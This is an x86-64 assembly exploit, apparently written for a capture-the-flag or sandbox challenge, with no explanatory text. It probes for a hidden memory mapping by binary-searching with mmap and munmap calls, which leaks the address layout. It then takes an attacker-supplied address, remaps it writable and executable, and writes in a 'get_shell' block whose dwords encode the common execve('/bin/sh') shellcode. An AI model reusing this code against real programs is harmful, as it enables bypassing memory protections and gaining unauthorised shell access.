
main:   ; Function begin
  xor r9d, r9d
  mov r8d, -1
  mov r10d, 0x22
  mov edx, 3
  mov rsi, 0x10000
  mov rdi, 0xdead0000
  mov eax, 9
  syscall

  mov rsp, 0xdead3000
  mov rbp, 0xdead3000

  mov rdi, 0xdead4800
  mov rsi, 0x0a0a0a0a0a0a
  mov [rdi], rsi

;;-> wait for attach
  mov edx, 0x400
  mov rsi, 0xdead0000
  mov edi, 0
  mov eax, 0
  syscall
  mov rsi, 5
  mov rdi, 0xdead0000
  call print_buf
;;<- end wait for attach


  mov     rax, qword 555000000000H
  mov     qword [rbp-58H], rax
  mov     qword [rbp-50H], rax
  mov     rax, qword 570000000000H
  mov     qword [rbp-48H], rax
  mov     rax, qword [rbp-50H]
  mov     qword [rbp-40H], rax
  jmp     ?_003

  ?_001:  mov     rax, qword [rbp-40H]
  mov     r9d, 0
  mov     r8d, 4294967295
  mov     ecx, 34
  mov     edx, 0
  mov     esi, 2147483648
  mov     rdi, rax
  mov eax, 9
  syscall
  mov     qword [rbp-38H], rax
  cmp     qword [rbp-38H], 0
  jz      ?_002
  mov     rax, qword [rbp-40H]
  shr     rax, 12
  mov     qword [rbp-50H], rax
  mov     qword [rbp-58H], rax
  mov     edx, 2147483648
  mov     rax, qword [rbp-40H]
  add     rax, rdx
  shr     rax, 12
  mov     qword [rbp-48H], rax

  call print_end
  mov rdi, qword [rbp-50H]
  call print_reg

  jmp     ?_004


  ?_002:
  ;call print_cont

  mov     rax, qword [rbp-40H]
  mov     esi, 2147483648
  mov     rdi, rax
  mov eax, 11
  syscall
  mov     eax, 2147483648
  add     qword [rbp-40H], rax
  ?_003:  mov     rax, qword [rbp-40H]
  cmp     rax, qword [rbp-48H]
  jc      ?_001
  ?_004:  jmp     ?_007

  ?_005:  mov     rdx, qword [rbp-48H]
  mov     rax, qword [rbp-50H]
  add     rax, rdx
  shr     rax, 1
  mov     qword [rbp-30H], rax
  mov     rax, qword [rbp-58H]
  mov     rdx, qword [rbp-30H]
  sub     rdx, rax
  mov     rax, rdx
  mov     qword [rbp-28H], rax
  mov     rax, qword [rbp-58H]
  shl     rax, 12
  mov     qword [rbp-20H], rax
  mov     rax, qword [rbp-28H]
  shl     rax, 12
  mov     qword [rbp-18H], rax
  mov     rax, qword [rbp-20H]
  mov     rsi, qword [rbp-18H]
  mov     r9d, 0
  mov     r8d, 4294967295
  mov     ecx, 34
  mov     edx, 0
  mov     rdi, rax
  mov eax, 9
  syscall
  mov     qword [rbp-10H], rax
  cmp     qword [rbp-10H], 0
  jz      ?_006
  mov     rax, qword [rbp-30H]
  mov     qword [rbp-48H], rax
  jmp     ?_007

  ?_006:  mov     rax, qword [rbp-30H]
  mov     qword [rbp-50H], rax
  mov     rax, qword [rbp-20H]
  mov     rdx, qword [rbp-18H]
  mov     rsi, rdx
  mov     rdi, rax
  mov eax, 11
  syscall
  ?_007:  mov     rax, qword [rbp-48H]
  sub     rax, qword [rbp-50H]
  cmp     rax, 1
  ja      ?_005

  call print_end
  mov rdi, qword [rbp-50H]
  call print_reg

  mov edx, 0x8
  mov rsi, 0xdead0000
  mov edi, 0
  mov eax, 0
  syscall

  mov rax, 0xdead0000
  mov r12, [rax]

get_shell:
  xor r9d, r9d
  mov r8d, -1
  mov r10d, 0x32
  mov edx, 7
  mov rsi, 0x1000
  mov rdi, r12
  mov eax, 9
  syscall
  mov rax, r12
  add rax, 0x124

mov dword [rax], 3142107185
add rax, 4
mov dword [rax], 2442567121
add rax, 4
mov dword [rax], 4288122064
add rax, 4
mov dword [rax], 1406924616
add rax, 4
mov dword [rax], 1385783124
add rax, 4
mov dword [rax], 2958971991
add rax, 4
mov dword [rax], 331579

mov rax, 0x100000
mov dword [rax], 0

  print_buf:
  mov rdx, rsi
  mov rsi, rdi
  mov edi, 1
  mov rax, 1
  syscall
  mov rdx, 1
  mov rsi, 0xdead4800
  mov edi, 1
  mov rax, 1
  syscall
  ret
  wait_for_attach:
  mov edx, 0x400
  mov rsi, 0xdead0000
  mov edi, 0
  mov eax, 0
  syscall
  ret
  print_reg:
  mov rax, 0xdead0000
  mov qword [rax], rdi
  mov rdi, rax
  mov rsi, 8
  jmp print_buf

  print_cont:
  mov rax, 0xdead0000
  mov qword [rax], 1953394531
  mov rdi, rax
  mov rsi, 4
  jmp print_buf

  print_end:
  mov rax, 0xdead0000
  mov qword [rax], 6581861
  mov rdi, rax
  mov rsi, 3
  jmp print_buf
